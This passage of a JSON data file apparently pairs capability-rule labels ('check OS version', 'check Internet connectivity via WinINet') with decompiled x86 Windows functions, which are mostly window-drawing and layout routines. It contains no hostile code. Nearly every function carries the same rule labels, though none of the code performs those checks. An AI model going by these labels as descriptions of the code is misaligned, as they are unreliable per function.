(iVar4 != 0);\n    }\n    fcn.0044909c();\n    return;\n}\n",
        "token_count": 387
    },
    "0044ce64": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044ce64(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    if (*(in_EAX + 0x30) != 0) {\n        iVar2 = *(*(in_EAX + 0x30) + 0x1cc);\n        if (iVar2 != 0) {\n            param_2 = param_2 - *(iVar2 + 8);\n        }\n        iVar2 = fcn.00414f48();\n        if (-1 < iVar2) {\n            iVar1 = *(*(*(in_EAX + 0x30) + 0x1d0) + 8);\n            if (param_2 < 0) {\n                param_2 = 0;\n            }\n            if (iVar1 <= param_2) {\n                param_2 = iVar1 + -1;\n            }\n            if (iVar2 != param_2) {\n                fcn.00414dd8();\n                fcn.00414f68();\n            }\n        }\n        if (*(in_EAX + 0x1b4) != 0) {\n            if (param_2 == 0) {\n                uVar3 = 1;\n            }\n            else if (param_2 == *(*(*(in_EAX + 0x30) + 0x1d0) + 8) + -1) {\n                uVar3 = 0;\n            }\n            else if (iVar2 < param_2) {\n                fcn.00414eec();\n                uVar3 = fcn.0044d1c8();\n            }\n            else {\n                if (iVar2 <= param_2) {\n                    return;\n                }\n                fcn.00414eec();\n                uVar3 = fcn.0044d1c8();\n            }\n            sub.user32.dll_SetWindowPos(*(in_EAX + 0x1b4), uVar3, 0, 0, 0, 0, 3);\n        }\n    }\n    return;\n}\n",
        "token_count": 460
    },
    "0044d1a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0044d1a4(void)\n\n{\n    int32_t *in_EAX;\n    \n    if (in_EAX[0x6d] == 0) {\n        if (in_EAX[0xc] != 0) {\n            fcn.0044d1a4();\n        }\n        (**(*in_EAX + 0x98))();\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "0044d568": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint32_t fcn.0044d568(void)\n\n{\n    uint32_t in_EAX;\n    \n    return in_EAX & 0xffffff00 | *(in_EAX + 0x1b4) != 0;\n}\n",
        "token_count": 51
    },
    "0044d68c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044d68c(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    char in_CL;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_5h;\n    \n    var_ch = 0;\n    puStack40 = 0x44d6ae;\n    iVar2 = fcn.00403f28();\n    uStack44 = 0x44d782;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00404154();\n    if (0 < *(iVar2 + 8)) {\n        var_10h = fcn.00414f48();\n        iVar4 = var_10h;\n        if (var_10h == -1) {\n            if (in_CL == '\\0') {\n                var_10h = 0;\n                iVar4 = var_10h;\n            }\n            else {\n                var_10h = *(iVar2 + 8) + -1;\n                iVar4 = var_10h;\n            }\n        }\n        do {\n            if (in_CL == '\\0') {\n                if (iVar4 == 0) {\n                    iVar4 = *(iVar2 + 8);\n                }\n                iVar4 = iVar4 + -1;\n            }\n            else {\n                iVar4 = iVar4 + 1;\n                if (iVar4 == *(iVar2 + 8)) {\n                    iVar4 = 0;\n                }\n            }\n            iVar3 = fcn.00414eec();\n            cVar1 = fcn.00404154();\n            if (((cVar1 != '\\0') && ((arg_ch == '\\0' || (*(iVar3 + 0x1d8) != '\\0')))) &&\n               ((arg_8h == '\\0' || (*(iVar3 + 0x30) == in_EAX)))) {\n                var_ch = iVar3;\n            }\n        } while ((var_ch == 0) && (iVar4 != var_10h));\n    }\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x44d789;\n    uStack44 = 0x44d781;\n    fcn.00403f58();\n    return;\n}\n",
        "token_count": 566
    },
    "0044d89c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044d89c(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t *in_ECX;\n    int32_t *in_EDX;\n    \n    iVar1 = in_EAX[0x1d];\n    if (*(iVar1 + 0x14) == 0) {\n        *in_EDX = 0;\n    }\n    else {\n        *in_EDX = *(in_EAX[0x1d] + 0x14);\n    }\n    if (*(iVar1 + 0x10) == 0) {\n        *in_ECX = 0;\n    }\n    else {\n        *in_ECX = *(in_EAX[0x1d] + 0x10);\n    }\n    if (*(iVar1 + 0xc) == 0) {\n        *arg_ch = 0;\n    }\n    else {\n        *arg_ch = *(in_EAX[0x1d] + 0xc);\n    }\n    if (*(iVar1 + 8) == 0) {\n        *arg_8h = 0;\n    }\n    else {\n        *arg_8h = *(in_EAX[0x1d] + 8);\n    }\n    if ((*(in_EAX + 0x52) & 0x10) != 0) {\n        iVar1 = *(in_EAX[0x1e] + 8) + *(in_EAX[0x1e] + 0x10);\n        if (0 < *in_EDX) {\n            *in_EDX = *in_EDX + iVar1;\n        }\n        if (iVar1 <= *arg_ch) {\n            *arg_ch = *arg_ch - iVar1;\n        }\n        iVar1 = *(in_EAX[0x1e] + 0xc) + *(in_EAX[0x1e] + 0x14);\n        if (0 < *in_ECX) {\n            *in_ECX = *in_ECX + iVar1;\n        }\n        if (iVar1 <= *arg_8h) {\n            *arg_8h = *arg_8h - iVar1;\n        }\n    }\n    (**(*in_EAX + 0x38))(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 518
    },
    "0044d960": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044d960(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *in_EDX;\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h_00;\n    int32_t lprc;\n    int32_t var_5ah;\n    int32_t var_56h;\n    int32_t var_52h;\n    char var_4eh;\n    char var_4dh;\n    int32_t var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    var_4h = in_EDX;\n    cVar1 = fcn.0044d568();\n    if ((cVar1 != '\\0') && (iVar3 = fcn.00449558(),  iVar3 != 0)) {\n        (**(*in_EAX + 0x44))();\n        (**(*in_EAX + 0x90))();\n        iVar3 = sub.user32.dll_IsRectEmpty();\n        if (iVar3 == 0) {\n            var_ch = (**(*in_EAX[0x1e] + 0x10))();\n            var_ch = var_ch - (var_56h - lprc);\n            var_10h = (**(*in_EAX[0x1e] + 0x10))();\n            var_10h = var_10h - (var_52h - var_5ah);\n            var_14h = (**(*in_EAX[0x1e] + 0x10))();\n            var_14h = var_14h - (var_56h - lprc);\n            var_18h = (**(*in_EAX[0x1e] + 0x10))();\n            var_18h = var_18h - (var_52h - var_5ah);\n            if (0 < *var_4h) {\n                *var_4h = *var_4h - var_ch;\n            }\n            if (0 < *var_8h) {\n                *var_8h = *var_8h - var_10h;\n            }\n            if (0 < *arg_ch) {\n                *arg_ch = *arg_ch - var_14h;\n            }\n            if (0 < *arg_8h) {\n                *arg_8h = *arg_8h - var_18h;\n            }\n            arg_8h_00 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff80;\n            var_20h = 0;\n            var_30h = 0;\n            var_24h = 0;\n            var_34h = 0;\n            var_28h = 0;\n            var_38h = 0;\n            var_2ch = 0;\n            var_3ch = 0;\n            iVar3 = fcn.00449558();\n            if (-1 < iVar3 + -1) {\n                var_1ch = 0;\n                do {\n                    iVar4 = fcn.0044951c();\n                    if ((*(iVar4 + 0x57) != '\\0') || (((*(iVar4 + 0x1c) & 0x10) != 0 && ((*(iVar4 + 0x51) & 4) == 0))))\n                    {\n                        arg_8h_00 = &var_4ch;\n                        fcn.0044d89c(arg_8h_00, &var_44h);\n                        cVar1 = *(iVar4 + 0x5b);\n                        if (cVar1 == '\\0') {\n                            if (*0x44dde4 == (*(iVar4 + 0x61) & *0x44dde4)) {\n                                var_4dh = '\\x01';\n                                if (0 < var_40h) {\n                                    iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                                    var_40h = ((var_56h - lprc) - iVar5) - var_40h;\n                                }\n                                if (0 < var_44h) {\n                                    iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                                    var_44h = ((var_56h - lprc) + var_44h) - iVar5;\n                                }\n                            }\n                            else {\n                                var_4dh = '\\0';\n                            }\n                        }\n                        else if (cVar1 - 1U < 2) {\n                            var_4dh = '\\x01';\n                        }\n                        else if (cVar1 == '\\x05') {\n                            var_4dh = '\\x02';\n                        }\n                        else {\n                            var_4dh = '\\x03';\n                        }\n                        if (*(iVar4 + 0x5b) == '\\0') {\n                            if (*0x44dde8 == (*(iVar4 + 0x61) & *0x44dde8)) {\n                                var_4eh = '\\x01';\n                                if (0 < var_48h) {\n                                    iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                                    var_48h = ((var_52h - var_5ah) - iVar5) - var_48h;\n                                }\n                                if (0 < var_4ch) {\n                                    iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                                    var_4ch = ((var_52h - var_5ah) + var_4ch) - iVar5;\n                                }\n                            }\n                            else {\n                                var_4eh = '\\0';\n                            }\n                        }\n                        else {\n                            uVar2 = *(iVar4 + 0x5b) - 3;\n                            if (uVar2 < 2) {\n                                var_4eh = '\\x01';\n                            }\n                            else if (uVar2 == 2) {\n                                var_4eh = '\\x02';\n                            }\n                            else {\n                                var_4eh = '\\x03';\n                            }\n                        }\n                        if (var_4dh - 1U < 2) {\n                            if (((0 < var_40h) && (*var_4h < var_40h)) && (*var_4h = var_40h,  var_20h < *var_4h)) {\n                                var_20h = *var_4h;\n                            }\n                            if (((0 < var_44h) && (var_44h < *arg_ch)) && (*arg_ch = var_44h,  var_24h < *arg_ch)) {\n                                var_24h = *arg_ch;\n                            }\n                        }\n                        else if (var_4dh == '\\x03') {\n                            iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                            var_30h = var_30h + iVar5;\n                            iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                            var_34h = var_34h + iVar5;\n                        }\n                        if (var_4eh - 1U < 2) {\n                            if (((0 < var_48h) && (*var_8h < var_48h)) && (*var_8h = var_48h,  var_28h < *var_8h)) {\n                                var_28h = *var_8h;\n                            }\n                            if (((0 < var_4ch) && (var_4ch < *arg_8h)) && (*arg_8h = var_4ch,  var_2ch < *arg_8h)) {\n                                var_2ch = *arg_8h;\n                            }\n                        }\n                        else if (var_4eh - 1U == 2) {\n                            iVar5 = (**(**(iVar4 + 0x78) + 0x10))();\n                            var_38h = var_38h + iVar5;\n                            iVar4 = (**(**(iVar4 + 0x78) + 0x10))();\n                            var_3ch = var_3ch + iVar4;\n                        }\n                    }\n                    var_1ch = var_1ch + 1;\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != 0);\n            }\n            if ((0 < var_20h) && (*var_4h < var_20h + var_30h)) {\n                *var_4h = var_20h + var_30h;\n            }\n            if ((0 < var_24h) && ((*arg_ch == 0 || (*arg_ch < var_24h + var_34h)))) {\n                *arg_ch = var_24h + var_34h;\n            }\n            if ((0 < var_28h) && (*var_8h < var_28h + var_38h)) {\n                *var_8h = var_28h + var_38h;\n            }\n            if ((0 < var_2ch) && ((*arg_8h == 0 || (*arg_8h < var_2ch + var_3ch)))) {\n                *arg_8h = var_2ch + var_3ch;\n            }\n            *in_FS_OFFSET = arg_8h_00;\n            if (0 < *var_4h) {\n                *var_4h = *var_4h + var_ch;\n            }\n            if (0 < *var_8h) {\n                *var_8h = *var_8h + var_10h;\n            }\n            if (0 < *arg_ch) {\n                *arg_ch = *arg_ch + var_14h;\n            }\n            if (0 < *arg_8h) {\n                *arg_8h = *arg_8h + var_18h;\n            }\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 2344
    },
    "0044dea0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.0044dea0(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_34h;\n    uint var_30h;\n    uint var_24h;\n    uint var_20h;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack72 = 0x44debe;\n    cVar1 = fcn.0044d568();\n    if ((cVar1 != '\\0') && (*(in_EAX + 0x5b) != '\\x05')) {\n        if ((*(in_EAX + 7) & 0x10) != 0) {\n            puStack72 = 0x44dee4;\n            iVar2 = fcn.00449558();\n            if (iVar2 < 1) {\n                return 1;\n            }\n        }\n        puStack72 = 0x44defa;\n        (**(*in_EAX + 0xc0))();\n        puStack72 = 0x44df05;\n        (**(*in_EAX + 0x44))();\n        puStack72 = 0x44df13;\n        (**(*in_EAX + 0x90))();\n        puStack72 = 0x44df1b;\n        fcn.00449074();\n        uStack76 = 0x44dfce;\n        uStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        puStack72 = &stack0xfffffffc;\n        iVar2 = fcn.00449558();\n        if (-1 < iVar2 + -1) {\n            do {\n                piVar3 = fcn.0044951c();\n                if ((*(piVar3 + 0x57) != '\\0') || (((*(piVar3 + 7) & 0x10) != 0 && ((*(piVar3 + 0x51) & 4) == 0)))) {\n                    (**(*piVar3 + 0x88))(piVar3[0x13], piVar3[0x12]);\n                }\n                iVar2 = iVar2 + -1;\n            } while (iVar2 != 0);\n        }\n        *in_FS_OFFSET = uStack80;\n        puStack72 = 0x44dfd5;\n        *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xffef;\n        uStack76 = 0x44dfcd;\n        uVar4 = fcn.0044907c();\n        return uVar4;\n    }\n    return 1;\n}\n",
        "token_count": 626
    },
    "0044e18c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044e18c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    uint uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    uint *in_FS_OFFSET;\n    uint uStack92;\n    uint uStack88;\n    uchar *puStack84;\n    uint uStack80;\n    uint dx;\n    uint var_38h;\n    int32_t lprcSrc1;\n    int32_t dy;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t nLeftRect;\n    int32_t nTopRect;\n    int32_t nRightRect;\n    int32_t nBottomRect;\n    uint hDC;\n    int32_t var_8h;\n    int32_t *var_4h;\n    \n    var_8h = param_2;\n    var_4h = in_EAX;\n    if ((*(in_EAX + 0x195) == '\\0') && (in_EAX[0x67] == 0)) {\n        uStack80 = 0x44e451;\n        (**(*in_EAX + -0x10))();\n        uStack80 = 0x44e456;\n        fcn.00437d14();\n        uStack80 = 0x44e45b;\n        cVar3 = fcn.00437e1c();\n        if ((cVar3 != '\\0') && ((*(var_4h + 0x52) & 2) != 0)) {\n            uStack80 = 0x44e46d;\n            fcn.00437d14();\n            uStack80 = 0x44e477;\n            fcn.0043876c();\n        }\n        return;\n    }\n    uStack80 = 0x44e1bf;\n    uStack80 = fcn.0044d1c8();\n    puStack84 = 0x44e1c5;\n    hDC = sub.user32.dll_GetWindowDC();\n    uStack88 = 0x44e43f;\n    uStack92 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa4;\n    puStack84 = &stack0xfffffffc;\n    uVar4 = fcn.0044d1c8(&fcn.0044e18c::nLeftRect);\n    sub.user32.dll_GetClientRect(uVar4);\n    uVar4 = fcn.0044d1c8(&fcn.0044e18c::lprcSrc1);\n    sub.user32.dll_GetWindowRect(uVar4);\n    uVar4 = fcn.0044d1c8(&fcn.0044e18c::lprcSrc1, 2);\n    sub.user32.dll_MapWindowPoints(0, uVar4);\n    sub.user32.dll_OffsetRect(&fcn.0044e18c::nLeftRect, -lprcSrc1, -dy);\n    sub.gdi32.dll_ExcludeClipRect(hDC, nLeftRect, nTopRect, nRightRect, nBottomRect);\n    iVar2 = dy;\n    iVar1 = lprcSrc1;\n    sub.user32.dll_InflateRect(&fcn.0044e18c::nLeftRect, var_4h[0x67], var_4h[0x67]);\n    lprcSrc1 = nLeftRect;\n    dy = nTopRect;\n    var_24h = nRightRect;\n    var_20h = nBottomRect;\n    uVar4 = fcn.0044d1c8(0xfffffff0);\n    uVar5 = sub.user32.dll_GetWindowLongA(uVar4);\n    if ((uVar5 & 0x200000) != 0) {\n        iVar6 = (***0x4929e4)(0x14);\n        var_24h = var_24h + iVar6;\n    }\n    if ((uVar5 & 0x100000) != 0) {\n        iVar6 = (***0x4929e4)(0x15);\n        var_20h = var_20h + iVar6;\n    }\n    if (*(var_4h + 0x195) != '\\0') {\n        iVar6 = 0;\n        if (*(var_4h + 0x193) != 0) {\n            iVar6 = var_4h[0x66];\n        }\n        if (*(var_4h + 0x65) != 0) {\n            iVar6 = iVar6 + var_4h[0x66];\n        }\n        if ((*(var_4h + 0x192) & 1) != 0) {\n            lprcSrc1 = lprcSrc1 - iVar6;\n        }\n        if ((*(var_4h + 0x192) & 2) != 0) {\n            dy = dy - iVar6;\n        }\n        if ((*(var_4h + 0x192) & 4) != 0) {\n            var_24h = var_24h + iVar6;\n        }\n        if ((*(var_4h + 0x192) & 8) != 0) {\n            var_20h = var_20h + iVar6;\n        }\n        sub.user32.dll_DrawEdge\n                  (hDC, &fcn.0044e18c::lprcSrc1, \n                   *((*(var_4h + 0x193) & 0x7f) * 4 + 0x4916a8) | *((*(var_4h + 0x65) & 0x7f) * 4 + 0x4916b8), \n                   *(var_4h + 0x192) | *(*(var_4h + 0x195) * 4 + 0x4916c8) | *(*(var_4h + 0x1d9) * 4 + 0x4916d8) |\n                   0x2000);\n    }\n    sub.gdi32.dll_IntersectClipRect(hDC, lprcSrc1, dy, var_24h, var_20h);\n    if (*(var_8h + 4) == 1) {\n        sub.user32.dll_OffsetRect(&fcn.0044e18c::lprcSrc1, -iVar1, -iVar2);\n    }\n    else {\n        sub.gdi32.dll_GetRgnBox(*(var_8h + 4), &fcn.0044e18c::nLeftRect);\n        uVar4 = fcn.0044d1c8(&fcn.0044e18c::nLeftRect, 2);\n        sub.user32.dll_MapWindowPoints(0, uVar4);\n        sub.user32.dll_IntersectRect(&fcn.0044e18c::lprcSrc1, &fcn.0044e18c::lprcSrc1, &fcn.0044e18c::nLeftRect);\n        sub.user32.dll_OffsetRect(&fcn.0044e18c::lprcSrc1, -iVar1, -iVar2);\n    }\n    uVar7 = fcn.00421508();\n    uVar4 = hDC;\n    sub.user32.dll_FillRect(hDC, &fcn.0044e18c::lprcSrc1, uVar7);\n    *in_FS_OFFSET = uVar4;\n    uVar4 = fcn.0044d1c8(hDC, 0x44e446);\n    sub.user32.dll_ReleaseDC(uVar4);\n    return;\n}\n",
        "token_count": 1695
    },
    "0044e544": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044e544(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint uStack20;\n    uint nSavedDC;\n    uint var_4h;\n    \n    if (*(param_2 + 0xc) == 1) {\n        uStack20 = 0x44e5ca;\n        (**(*in_EAX + -0x10))();\n    }\n    else {\n        if (((*(param_2 + 8) & 1) == 0) || (*(in_EAX + 0x57) != '\\0')) {\n            uStack20 = *(param_2 + 4);\n            puStack24 = 0x44e574;\n            uVar1 = sub.gdi32.dll_SaveDC();\n            uStack28 = 0x44e5ad;\n            uStack32 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffffe0;\n            puStack24 = &stack0xfffffffc;\n            fcn.0044ab78();\n            *in_FS_OFFSET = uStack32;\n            puStack24 = 0x44e5ca;\n            uStack32 = *(param_2 + 4);\n            uStack28 = uVar1;\n            sub.gdi32.dll_RestoreDC();\n            return;\n        }\n        uStack20 = 0x44e5be;\n        (**(*in_EAX + -0x10))();\n    }\n    return;\n}\n",
        "token_count": 354
    },
    "0044e630": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044e630(uint param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    \n    iVar1 = *(in_EAX + 0x30);\n    while ((iVar2 = iVar1,  *(in_EAX + 0x94) == 0 && (iVar2 != 0))) {\n        in_EAX = iVar2;\n        iVar1 = *(iVar2 + 0x30);\n    }\n    if (in_EAX != 0) {\n        fcn.00445138(param_2 & 0x7f);\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "0044e7a4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0044e7a4(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x44e7b8;\n    cVar2 = fcn.0044d568();\n    if ((cVar2 == '\\0') || ((*(in_EAX + 0x55) & 0x20) != 0)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        puStack20 = 0x44e7de;\n        fcn.0044e6dc();\n    }\n    uStack24 = 0x44e814;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.00445480();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x44e81b;\n    if (bVar1) {\n        uStack24 = 0x44e813;\n        fcn.0044e6dc();\n    }\n    return;\n}\n",
        "token_count": 295
    },
    "0044e820": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0044e820(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.0040427c();\n        param_2 = extraout_DL;\n    }\n    fcn.004443dc();\n    uVar1 = fcn.00421624();\n    *(in_EAX + 400) = uVar1;\n    fcn.00443e20();\n    if (param_2 != '\\0') {\n        fcn.004042d4();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 198
    },
    "0044e8bc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044e8bc(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(param_2 + 4) != 0) {\n        puStack16 = 0x44e8de;\n        fcn.00421928();\n        uStack20 = 0x44e957;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack28 = 0x44e8fd;\n        puStack16 = &stack0xfffffffc;\n        fcn.00421d14();\n        uStack32 = 0x44e934;\n        uStack36 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffdc;\n        puStack28 = &stack0xfffffffc;\n        (**(*in_EAX + 0x90))();\n        *in_FS_OFFSET = uStack36;\n        puStack28 = 0x44e93b;\n        uStack32 = 0x44e933;\n        fcn.00421d14();\n        return;\n    }\n    return;\n}\n",
        "token_count": 302
    },
    "0044ebbc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.0044ebbc(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x44ec47;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    fcn.0044e618();\n    if (*(in_EAX + 600) == '\\0') {\n        fcn.004455ac();\n        fcn.00421ac0();\n        fcn.00444c6c();\n        fcn.004455ac();\n        fcn.00421adc();\n        fcn.00444ca0();\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x44ec4e;\n    uStack24 = 0x44ec46;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 233
    },
    "0044f000": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044f000(uint param_1, int16_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((param_2 != *(in_EAX + 0x68)) && (*(in_EAX + 0x68) = param_2,  *(in_EAX + 0x6a) != '\\0')) {\n        fcn.0046016c();\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "0044f050": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
